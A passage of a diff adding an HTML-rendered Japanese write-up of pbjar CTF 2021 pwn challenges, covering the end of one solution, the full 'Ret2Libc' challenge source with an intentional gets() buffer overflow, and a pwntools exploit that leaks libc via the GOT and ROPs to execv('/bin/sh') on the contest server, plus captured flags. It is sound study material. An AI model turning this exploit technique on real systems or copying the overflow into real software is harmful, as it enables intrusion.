+        <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">msg</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)))</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+        <span class="k">pass</span>
+
+    <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;You&#34;</span><span class="p">)</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;You&#34;</span> <span class="o">+</span> <span class="n">msg</span><span class="p">)</span>
+    <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;beat&#34;</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br />
+python3になってからカウンタ値を文字列と連結するのがめんどくさいんですが（ハイライト部分）、もっといいやり方があるんだろうな、きっと。。。（勉強しておきます）</p>
+<p><br /></p>
+<p>Flag: <code>flag{4nd_s0_th3_3xpl01ts_b3g1n}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="pwn-ret2libc">[Pwn]: Ret2Libc</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_pwn2.png" alt="pbjar_CTF_2021_pwn2.png">
+<p>ソースコードも添付されています。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">divide</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;---------------------------------------------------------------------------------------</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">asciiart</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;__________        __  ________ .____    ._____. &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">______   </span><span class="se">\\</span><span class="s"> _____/  |_</span><span class="se">\\</span><span class="s">_____  </span><span class="se">\\</span><span class="s">|    |   |__</span><span class="se">\\</span><span class="s">_ |_&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34; |       _// __ </span><span class="se">\\</span><span class="s">   __</span><span class="se">\\</span><span class="s">/  ____/|    |   |  || __ </span><span class="se">\\</span><span class="s">_/ ___</span><span class="se">\\</span><span class="s"> &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34; |    |   </span><span class="se">\\</span><span class="s">  ___/|  | /       </span><span class="se">\\</span><span class="s">|    |___|  || </span><span class="se">\\</span><span class="s">_</span><span class="se">\\</span><span class="s"> </span><span class="se">\\</span><span class="s">  </span><span class="se">\\</span><span class="s">___ &#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34; |____|_  /</span><span class="se">\\</span><span class="s">___  &gt;__| </span><span class="se">\\</span><span class="s">_______ </span><span class="se">\\</span><span class="s">_______ </span><span class="se">\\</span><span class="s">__||___  /</span><span class="se">\\</span><span class="s">___  &gt;&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;        </span><span class="se">\\</span><span class="s">/     </span><span class="se">\\</span><span class="s">/             </span><span class="se">\\</span><span class="s">/       </span><span class="se">\\</span><span class="s">/       </span><span class="se">\\</span><span class="s">/     </span><span class="se">\\</span><span class="s">/ </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">intro</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;INTRO: </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;This is a classic ret2libc task, and understanding it is essential to solving all pwn problems this contest.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Essentially, a buffer overflow is more powerful than you might have realized!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;With just a single buffer overflow, you can get a shell on a remote server, even without a win function! :eyes:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">setup</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;SETUP: </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;To try this exploit on your computer, you need to use a tool called patchelf to link the binary with the correct libc and dynamic linker version provided.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;To get patchelf, type &#39;sudo apt-get install patchelf&#39; in your terminal.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;To use it, type &#39;patchelf --set-interpreter ./ld-ret2libc.so --add-needed ./libc-ret2libc.so ./ret2libc&#39;.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;In general, you will need to do this for every problem where your exploit uses the libc.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">explain_pltgot</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;ABOUT PLT AND GOT: </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hopefully, you remember how to use an overflow to rop to a win function.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Well that idea can be expanded on further, by calling functions in both the binary and libc.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;When you use library calls, have you ever wondered how that works? :think:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;The binary will internally have some links to the functions in libc, that it uses to call upon.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;These functions are known as plt functions, as they are located in the .plt section of the binary.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;For example, in this binary, the &#39;puts&#39; and &#39;gets&#39; function will be located in the plt.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;However, the actual libc addresses the plt functions use to call are located in a seperated section, called the .got section.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You can find these address offsets for a binary in pwntools using the ELF module, or you can also use objdump/readelf.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">explain_rop</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;HOW TO USE PLT AND GOT TO CALL SYSTEM: </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Okay, so how does this help?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Well, since system is in libc that the program uses, what is stopping us from just calling that (why do you think it&#39;s called ret2libc)? :eyes:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;But wait, libc addresses are randomized, how do we know the libc base address?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;If only there were a plt function you could call with rop that could print a libc address from the got table...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Also, even with one overflow, what if could you call a function to get back to another overflow again? :think:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;One more thing, to load addresses to functions in x86_64 binaries, you need to use something called gadgets.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Functions with a single variable are loaded with the &#39;pop rdi ; ret&#39; gadget, which then puts the following address on the stack into the rdi register.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You rop to them just like anything else, by putting their address after the overflow.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;You can find their addresses with the tool ROPgadget.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">resources</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;RESOURCES: </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Still confused?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Luckily, since this is likely your first ret2libc, I&#39;ll give you some links to make it easy. :sunglasses:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hopefully these will help you understand:</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Article tutorial: https://pwning.tech/2019/07/29/ret2libc-pwntools/&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Similar problem writeup (the code will probably help a lot): https://github.com/datajerk/ctf-write-ups/blob/master/redpwnctf2020/the-library/README.md&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Elf module pwntools: https://docs.pwntools.com/en/2.2.0/elf.html&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;ROPgadget download: https://github.com/JonathanSalwan/ROPgadget&#34;</span><span class="p">);</span> 
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Also in general, make sure you use &#39;peda&#39; extenion for gdb: https://github.com/longld/peda&#34;</span><span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;And this may make life much easier: https://docs.pwntools.com/en/stable/rop/rop.html</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;And if that&#39;s not enough, remember this is a classic problem, so there should be tons of similar writeups you can google!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">learn</span><span class="p">(){</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;WANT TO LEARN: </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Before we start, would you like to learn about ret2libc?[y/N]&#34;</span><span class="p">);</span>
+
+	<span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;y&#39;</span> <span class="o">||</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;Y&#39;</span><span class="p">){</span>
+		<span class="n">divide</span><span class="p">();</span>
+
+		<span class="n">explain_pltgot</span><span class="p">();</span>
+
+		<span class="n">divide</span><span class="p">();</span>
+
+		<span class="n">explain_rop</span><span class="p">();</span>
+
+		<span class="n">divide</span><span class="p">();</span>
+
+		<span class="n">resources</span><span class="p">();</span>
+	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;I see, you must be a natural!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">farewell</span><span class="p">(){</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;FAREWELL: </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Well did it work? Wait, did it even start?</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;(If you think it should work and it didn&#39;t, try ropping to &#39;ret&#39; gadget [pop_rdi + 1] first to align stack.)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;Adios!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+	<span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+	<span class="n">asciiart</span><span class="p">();</span>
+
+	<span class="n">divide</span><span class="p">();</span>
+
+	<span class="n">intro</span><span class="p">();</span>
+
+	<span class="n">divide</span><span class="p">();</span>
+
+	<span class="n">setup</span><span class="p">();</span>
+
+	<span class="n">divide</span><span class="p">();</span>
+
+	<span class="n">learn</span><span class="p">();</span>
+
+	<span class="n">divide</span><span class="p">();</span>
+
+	<span class="n">farewell</span><span class="p">();</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<h3 id="solution-1">Solution</h3>
+<p>これはもう、今まで何度かやってきたのと同じです。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding:utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ret2libc&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;143.198.127.103&#39;</span><span class="p">,</span> <span class="mi">42001</span><span class="p">)</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">puts</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">main</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;ret2libc?[y/N]</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;natural!</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="c1"># puts = u64(s.recv(6) + b&#39;\x00\x00&#39;)</span>
+<span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;puts: </span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">puts</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.31.so&#39;</span><span class="p">,</span> <span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">puts</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">execv</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)),</span> <span class="mi">0</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;ret2libc?[y/N]</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;natural!</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>	
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>Flag: <code>flag{th3_wh0l3_us3l3r4nd_1s_my_pl4ygr0und}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="pwn-fmtstr">[Pwn]: FmtStr</h2>
+<hr>
+<img src="https://captureamerica.github.io/writeups/img/pbjar_CTF_2021_pwn3.png" alt="pbjar_CTF_2021_pwn3.png">
+<p>ソースコードも添付されています。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
